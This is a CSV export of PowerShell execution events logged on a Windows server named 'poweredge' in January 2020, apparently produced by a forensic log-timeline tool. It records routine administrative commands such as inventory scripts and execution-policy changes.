Timestamp,Logged,Hostname,ExtIP,Description,Details,EventData,SourceFile
2020-01-14 14:57:56,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\system32\ServerManager.exe,-,Windows PowerShell.evtx
2020-01-14 14:58:00,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\system32\wsmprovhost.exe -Embedding,-,Windows PowerShell.evtx
2020-01-14 14:58:05,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\system32\wsmprovhost.exe -Embedding,-,Windows PowerShell.evtx
2020-01-14 14:58:06,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\system32\wsmprovhost.exe -Embedding,-,Windows PowerShell.evtx
2020-01-15 08:32:58,Logged,poweredge,-,PowerShell 명령 실행,PowerShell -NoProfile -ExecutionPolicy Bypass -File .\call_inventory.ps1 -CliToStdout,-,Windows PowerShell.evtx
2020-01-15 08:32:59,Logged,poweredge,-,PowerShell 명령 실행,PowerShell -NoProfile -ExecutionPolicy Bypass -File .\call_inventory.ps1 -CliToStdout,-,Windows PowerShell.evtx
2020-01-15 09:05:58,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-ExecutionPolicy Unrestricted -force,-,Windows PowerShell.evtx
2020-01-15 09:05:58,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-ExecutionPolicy Unrestricted -force; C:\HDService\Bin\LangList.ps1,-,Windows PowerShell.evtx
2020-01-15 09:06:05,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-ExecutionPolicy Unrestricted -force,-,Windows PowerShell.evtx
2020-01-15 09:06:05,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command Set-ExecutionPolicy Unrestricted -force; C:\HDService\Bin\LangList.ps1,-,Windows PowerShell.evtx
2020-01-15 09:08:31,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe C:\Users\Administrator\Desktop\LangList.ps1,-,Windows PowerShell.evtx
2020-01-15 09:08:37,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\Administrator\Desktop\LangList.ps1',-,Windows PowerShell.evtx
2020-01-15 09:28:27,Logged,poweredge,-,PowerShell 명령 실행,PowerShell -NoProfile -ExecutionPolicy Bypass -File .\call_inventory.ps1 -CliToStdout,-,Windows PowerShell.evtx
2020-01-15 09:28:28,Logged,poweredge,-,PowerShell 명령 실행,PowerShell -NoProfile -ExecutionPolicy Bypass -File .\call_inventory.ps1 -CliToStdout,-,Windows PowerShell.evtx
2020-01-15 09:28:29,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,-,Windows PowerShell.evtx
2020-01-15 14:29:09,Logged,poweredge,-,PowerShell 명령 실행,PowerShell -NoProfile -ExecutionPolicy Bypass -File .\call_inventory.ps1 -CliToStdout,-,Windows PowerShell.evtx
2020-01-15 14:29:12,Logged,poweredge,-,PowerShell 명령 실행,PowerShell -NoProfile -ExecutionPolicy Bypass -File .\call_inventory.ps1 -CliToStdout,-,Windows PowerShell.evtx
2020-01-16 11:34:50,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,-,Windows PowerShell.evtx
2020-01-16 11:35:48,Logged,poweredge,-,PowerShell 명령 실행,PowerShell -NoProfile -ExecutionPolicy Bypass -File .\call_inventory.ps1 -CliToStdout,-,Windows PowerShell.evtx
2020-01-16 11:35:49,Logged,poweredge,-,PowerShell 명령 실행,PowerShell -NoProfile -ExecutionPolicy Bypass -File .\call_inventory.ps1 -CliToStdout,-,Windows PowerShell.evtx
2020-01-21 08:58:05,Logged,poweredge,-,PowerShell 명령 실행,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,-,Windows PowerShell.evtx
